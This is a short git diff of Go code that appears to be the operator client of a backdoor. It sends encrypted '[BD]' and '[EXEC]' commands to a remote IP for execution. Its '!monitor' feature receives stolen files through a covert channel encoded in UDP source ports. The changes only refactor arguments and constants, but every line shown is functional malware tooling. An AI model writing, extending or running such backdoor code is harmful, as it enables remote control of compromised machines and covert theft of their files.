@@ -56,7 +56,7 @@ func intiateClient(ip string, port, lport uint16){
 		input, _ := reader.ReadString('\n');
 		input = strings.TrimSpace(input);
 		if strings.HasPrefix(input, "!") {
-			sendEncryptedData(port, "[BD]" + input, ip);
+			sendEncryptedData(port, "[BD]" + input, ip, CMD);
 			if strings.HasPrefix(input, "!monitor") {
 				args := strings.Split(input, " ");
 				go fileWait(ip, args[1], lport + 1)
@@ -65,7 +65,7 @@ func intiateClient(ip string, port, lport uint16){
 			fmt.Print(helpStr);
 			continue;
 		} else {
-			sendEncryptedData(port, "[EXEC]" + input, ip);
+			sendEncryptedData(port, "[EXEC]" + input, ip, CMD);
 		}
 	}
 }
@@ -112,7 +112,7 @@ func fileWait(ip, filename string, lport uint16){
 		if incomingIP == ip && uint16(udpLayer.DstPort) == lport + 1 {
 			err = binary.Write(fBuffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
 			checkError(err)
-		} else if incomingIP == ip && uint16(udpLayer.DstPort) == SND_CMPLETE + 1 {
+		} else if incomingIP == ip && uint16(udpLayer.DstPort) == FSND_CMPLETE {
 			fmt.Print(fBuffer)
 			fmt.Println("File transfer completed.")
 			fBuffer.Reset()
